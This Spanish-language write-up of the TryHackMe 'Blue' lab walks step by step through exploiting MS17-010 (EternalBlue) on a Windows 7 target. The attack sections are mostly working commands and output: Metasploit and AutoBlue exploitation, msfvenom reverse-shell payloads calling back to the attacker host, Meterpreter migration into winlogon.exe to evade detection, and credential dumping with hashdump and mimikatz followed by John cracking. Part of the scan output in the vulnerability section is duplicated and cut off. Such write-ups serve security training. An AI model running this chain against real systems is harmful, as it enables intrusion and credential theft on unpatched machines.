---
title: Blue Writeup - TryHackMe
date: 2023-03-28
categories: [Writeups, THM]
tags: [Windows, THM, CTF, Easy, Eternal Blue, MS17-010, Cracking de contraseñas]
image:
  path: /assets/img/commons/blue/blue.jpg
---

¡Hola!

En este writeup, exploraremos la sala [**Blue**](https://tryhackme.com/room/blue) de TryHackMe, de dificultad fácil según la plataforma. A través de esta sala, aprenderemos a hackear una máquina Windows, aprovechando problemas comunes de desconfiguración. Específicamente, veremos cómo explotar la famosa vulnerabilidad **EternalBlue** o **MS17-010** de forma automática y manual. 

¡Empecemos!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.206.58
PING 10.10.206.58 (10.10.206.58) 56(84) bytes of data.
64 bytes from 10.10.206.58: icmp_seq=1 ttl=125 time=273 ms

--- 10.10.206.58 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 273.043/273.043/273.043/0.000 ms
```

Dado que el `TTL` es cercano a 128, podemos inferir que la máquina objetivo probablemente sea Windows.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS --min-rate 5000 10.10.206.58 -oG allPorts.txt
```

Donde:

- `-p-`: indica que se escaneen todos los puertos posibles (65535) del objetivo.
- `--open`: indica que se muestren solo los puertos abiertos, ignorando los cerrados o filtrados.
- `-n`: indica que no se haga resolución DNS.
- `-sS`: indica que se use el tipo de escaneo TCP SYN.
- `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
- `10.10.206.58`: indica la dirección IP del objetivo a escanear.
- `-oG allPorts.txt`: indica que se guarde el resultado del escaneo en formato grepeable en el archivo allPorts.txt.

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 18:19 -05
Nmap scan report for 10.10.206.58
Host is up (0.28s latency).
Not shown: 65282 closed tcp ports (reset), 244 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 16.04 seconds
```

Vemos que hay varios puertos habilitados, entre ellos el `135 (RPC)`, `139/445 (SMB)`, `3389 (RDP)`, entre otros de carácter desconocido de momento.

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados, con el propósito de obtener más información sobre la configuración y posibles vulnerabilidades del sistema objetivo.

```bash
❯ nmap -p 135,139,445,3389,49152,49153,49154,49158,49159 -sVC --min-rate 5000 10.10.206.58 -oN services.txt
```

Donde:

- `-p 135,139,445,3389,49152,49153,49154,49158,49159`: indica que se escaneen solo los puertos especificados del objetivo.
- `-sV`: indica que se sondeen los puertos abiertos para determinar la información de servicio y versión.
- `-sC`: indica que se ejecute el script por defecto de Nmap, que realiza varias pruebas comunes como detección de vulnerabilidades o enumeración de recursos.
- `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
- `10.10.206.58`: indica la dirección IP del objetivo a escanear.
- `-oN services.txt`: indica que se guarde el resultado del escaneo en formato normal (fácil de leer por humanos) en el archivo services.txt.

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 18:23 -05
Nmap scan report for 10.10.206.58
Host is up (0.27s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2023-03-28T23:24:36+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2023-03-27T23:15:33
|_Not valid after:  2023-09-26T23:15:33
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2023-03-28T23:24:22+00:00
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
|_clock-skew: mean: 59m59s, deviation: 2h14m10s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 0235d94c064b (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-03-28T18:24:21-05:00
| smb2-time: 
|   date: 2023-03-28T23:24:21
|_  start_date: 2023-03-28T23:15:31

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.95 seconds
```

Dentro de los aspectos más destacados del informe, podemos señalar que es posible que el sistema operativo de la máquina objetivo sea `Windows 7 Professional`. Además, cabe destacar que las firmas de SMB están deshabilitadas.

## Análisis de vulnerabilidades

---

El servicio SMB es el que más nos interesa en esta máquina, así que vamos a ejecutar un escaneo de vulnerabilidades conocidas con el script `vuln` de `Nmap`.

```bash
❯ nmap -p 135,139,445,3389,49152,49153,49154,49158,49159 -sVC --min-rate 5000 10.10.206.58 -oN services.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 18:23 -05
Nmap scan report for 10.10.206.58
Host is up (0.27s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2023-03-28T23:24:36+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2023-03-27T23:15:33
|_Not valid after:  2023-09-26T23:15:33
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
❯ nmap -p 139,445 --script vuln 10.10.206.58
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 18:28 -05
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.206.58
Host is up (0.28s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

Nmap done: 1 IP address (1 host up) scanned in 45.12 seconds
```

Los resultados permiten afirmar que la máquina está expuesta a la vulnerabilidad `MS17-010 (EternalBlue)`.

## Explotación

---

### Explotación automática - SMB - Remote Code Execution (Metasploit) (MS17-010)

Una vez confirmada la vulnerabilidad `MS17-010`, buscamos un exploit de `Metasploit` que pueda explotarla.

```bash
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```

En este caso, empleamos el exploit `exploit/windows/smb/ms17_010_eternalblue`. Configuramos las opciones correspondientes del módulo y luego lanzamos el exploit.

- `RHOST` → para especificar la dirección IP del host de destino
- `payload` → útil para especificar el tipo de carga útil, en este caso, el shell TCP inverso de Windows
- `LHOST` → para especificar la dirección IP del host local para conectarse

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.206.58
rhosts => 10.10.206.58
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.2.11.100
lhost => 10.2.11.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

Utilizamos específicamente el payload `windows/x64/shell/reverse_tcp` para obtener una shell convencional. Luego, aplicamos un módulo de `Metasploit` para migrar a una shell más robusta y versátil, como `Meterpreter`.

La correcta configuración y ejecución del exploit nos proporciona una shell con privilegios de `nt authority\system`.

```bash
[*] 10.10.206.58:445 - Connecting to target for exploitation.
[+] 10.10.206.58:445 - Connection established for exploitation.
[+] 10.10.206.58:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.206.58:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.206.58:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.206.58:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.206.58:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.206.58:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.206.58:445 - Trying exploit with 22 Groom Allocations.
[*] 10.10.206.58:445 - Sending all but last fragment of exploit packet
[*] 10.10.206.58:445 - Starting non-paged pool grooming
[+] 10.10.206.58:445 - Sending SMBv2 buffers
[+] 10.10.206.58:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.206.58:445 - Sending final SMBv2 buffers.
[*] 10.10.206.58:445 - Sending last fragment of exploit packet!
[*] 10.10.206.58:445 - Receiving response from exploit packet
[+] 10.10.206.58:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.206.58:445 - Sending egg to corrupted connection.
[*] 10.10.206.58:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.206.58
[*] Command shell session 1 opened (10.2.11.100:4444 -> 10.10.206.58:49198) at 2023-03-28 18:39:21 -0500
[+] 10.10.206.58:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.206.58:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.206.58:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>whoami
whoami
nt authority\system
```

### Shell a Meterpreter

Para migrar de la shell convencional que hemos obtenido a una `meterpreter`, seguimos estos pasos: primero, ponemos en segundo plano nuestra sesión actual con el comando `CTRL + Z`; segundo, buscamos un módulo en `Metasploit` que nos permita pasar de una shell básica a una sesión Meterpreter.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade

Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
```

El resultado de la búsqueda nos proporciona el módulo `post/multi/manage/shell_to_meterpreter`. La única opción requerida por el módulo es el ID de sesión que se desea transformar en Meterpreter. En este caso, especificamos el ID de la sesión de la shell convencional que habíamos generado previamente, que corresponde al ID 1.

```bash
msf6 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.2.11.100:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (200774 bytes) to 10.10.206.58
[*] Meterpreter session 2 opened (10.2.11.100:4433 -> 10.10.206.58:49206) at 2023-03-28 18:45:17 -0500
[*] Stopping exploit/multi/handler
```

Después de configurarlo, ejecutamos el módulo y logramos obtener una nueva sesión `meterpreter`. Para confirmarlo, listamos las sesiones actuales con el comando `sessions`.

```bash
msf6 post(multi/manage/shell_to_meterpreter) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                                               Connection
  --  ----  ----                     -----------                                               ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.2.11.100:4444 -> 10.10.206.58:49198 (10.10.206.58)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                              10.2.11.100:4433 -> 10.10.206.58:49206 (10.10.206.58)
```

El resultado indica que hay dos sesiones activas: la sesión con ID 1 corresponde a la shell convencional, mientras que la sesión con ID 2 corresponde a la sesión de Meterpreter.

Establecemos una conexión con la sesión `meterpreter` mediante el comando `sessions -i 2`.

```bash
msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```

Dentro de la sesión, podemos usar el comando `ps` para ver los procesos que se están ejecutando en la máquina víctima.

```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 484   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 588   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 600   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe

[...]
```

Para evadir detecciones, migramos al proceso `winlogon.exe`, que es un proceso habitual en sistemas operativos Windows. Para ello, usamos el comando `migrate 644`, indicando el identificador del proceso.

```bash
meterpreter > migrate 644
[*] Migrating from 1796 to 644...
[*] Migration completed successfully.
meterpreter > getpid 
Current pid: 644
```

### Cracking de contraseñas (meterpreter)

Con el comando `hashdump`, podemos obtener los usuarios y los hashes NTLM de la máquina remota en formato `LM:NT`.

```bash
meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Almacenamos los hashes obtenidos en un archivo para tratar de descifrarlos con la herramienta `John the Ripper` o `Hashcat`.

En este caso, optamos por `John the Ripper` y usamos el siguiente comando:

```bash
❯ john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Administrator)     
alqfna22         (Jon)     
2g 0:00:00:00 DONE (2023-03-28 18:52) 4.166g/s 21250Kp/s 21250Kc/s 21260KC/s alr19882006..alpusidi
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```

Con estas credenciales, podemos optar por acceder a la máquina a través del protocolo RDP (`3389/tcp`) mediante el uso del siguiente comando:

```bash
rdesktop -u Jon -p alqfna22 -g 90% 10.10.206.58
```

Donde:

- `-u Jon`: indica el nombre de usuario que se utilizará para iniciar sesión en el servidor Windows al que se está conectando.
- `-p alqfna22`: indica la contraseña del usuario especificado en el argumento "-u".
- `-g 90%`: indica el tamaño de la pantalla del escritorio remoto en porcentaje de la pantalla del cliente.
- `10.10.206.58`: indica la dirección IP del servidor de escritorio remoto al que se va a conectar.

![rdp](/assets/img/commons/blue/rdp.png){: .center-image }

Como último paso, buscamos las banderas. Para agilizar la búsqueda, usamos el siguiente comando que realiza una búsqueda recursiva de archivos que coincidan con el patrón `flag`.

```bash
C:\>dir /s /b flag*
dir /s /b flag*
C:\flag1.txt
C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk
C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk
C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk
C:\Users\Jon\Documents\flag3.txt
C:\Windows\System32\config\flag2.txt
```

Después de conocer las rutas absolutas de las banderas, procedemos a leer el contenido de cada una de ellas.

```bash
C:\>type C:\flag1.txt
type C:\flag1.txt
flag{***************}
C:\>type C:\Windows\System32\config\flag2.txt
type C:\Windows\System32\config\flag2.txt
flag{***************}
C:\>type C:\Users\Jon\Documents\flag3.txt
type C:\Users\Jon\Documents\flag3.txt
flag{***************}
```

### Explotación manual - SMB - **AutoBlue-MS17-010**

Para realizar la explotación manual, emplearemos el exploit disponible en el repositorio  → [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)

Así que primero clonaremos el repositorio en nuestro sistema.

```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
```

Nos movemos al repositorio clonado.

```bash
cd AutoBlue-MS17-010
```

Navegamos hasta el directorio `shellcode` y ejecutamos el comando:

```bash
./shell_prep.sh
```

Este script nos brinda la posibilidad de adaptar nuestros payloads a las arquitecturas x64 y x86 de acuerdo a nuestras requerimientos específicos. Los parámetros de configuración son los siguientes:

- `LHOST` → para especificar la dirección IP del host local para conectarse
- `LPORT` → para especificar el puerto en escucha del host local, tanto para arquitectura x64 y x86.
- `Type` → para especificar un payload por etapas o sin etapas. En este caso utilizaremos un payload sin etapas para poder recibir la conexión con `netcat`.

```bash
❯ ./shell_prep.sh
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
LHOST for reverse connection:
10.2.11.100
LPORT you want x64 to listen on:
80
LPORT you want x86 to listen on:
443
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
1
Generating x64 cmd shell (stageless)...

msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.2.11.100 LPORT=80
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Saved as: sc_x64_msf.bin

Generating x86 cmd shell (stageless)...

msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.2.11.100 LPORT=443
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Saved as: sc_x86_msf.bin

MERGING SHELLCODE WOOOO!!!
DONE
```

Tras ejecutar el script, nos ponemos en escucha en el puerto especificado (`80`) y, desde el directorio raíz del repositorio, lanzamos el exploit, indicando como parámetro la dirección IP de la máquina víctima y el shell code que habíamos generado antes.

```bash
❯ python eternalblue_exploit7.py 10.10.206.58 shellcode/sc_x64.bin
shellcode size: 1232
numGroomConn: 13
Target OS: Windows 7 Professional 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
done
```

> Es normal que el exploit falle en los primeros intentos, por lo que no hay que desanimarse. En mi caso, logré ejecutarlo con éxito después del cuarto intento.
{: .prompt-info }

Si todo salió bien, deberíamos obtener una shell con el usuario `nt authority\system`.

```bash
❯ rlwrap nc -nlvp 80
listening on [any] 80 ...
connect to [10.2.11.100] from (UNKNOWN) [10.10.206.58] 49279
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### Cracking de contraseñas (Mimi Katz)

Con el acceso al sistema como `nt authority\system`, podemos obtener los hashes de las contraseñas de los usuarios con la herramienta `mimikatz`. Para usar esta herramienta en la máquina víctima, nos ubicamos en el directorio `/usr/share/windows-resources/mimikatz/x64` de la máquina atacante (Kali) y creamos un recurso compartido con cualquier nombre (en este caso se uso “a”), que contenga `mimikatz.exe`. Luego, desde la máquina víctima, descargamos el archivo con el comando `copy \10.2.11.100\a\mimikatz.exe`.

- Servidor (kali):
    
    ```bash
    ❯ impacket-smbserver a .
    Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
    
    [*] Config file parsed
    [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
    [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
    [*] Config file parsed
    [*] Config file parsed
    [*] Config file parsed
    ```
    
- Cliente (blue):
    
    ```bash
    C:\Windows\Temp>copy \\10.2.11.100\\a\\mimikatz.exe
    copy \\10.2.11.100\\a\\mimikatz.exe
            1 file(s) copied.
    ```
    

Una vez ejecutado `mimikatz.exe` en la máquina víctima, usamos el comando `lsadump::sam` , para obtener los hashes NTLM de los usuarios locales de Windows a partir de la base de datos SAM (Security Account Manager).

```bash
C:\Windows\Temp>mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::sam
Domain : JON-PC
SysKey : 55bd17830e678f18a3110daf2c17d4c7
Local SID : S-1-5-21-2633577515-2458672280-487782642

SAMKey : c74ee832c5b6f4030dbbc7b51a011b1e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Jon
  Hash NTLM: ffb43f0de35be4d9917ac0cc8ad57f8d
```

Con los hashes NTLM obtenidos, podemos nuevamente emplear la herramienta `John the Ripper` o `Hash Cat` para crackear las contraseñas de los usuarios del sistema.

¡Happy Hacking!
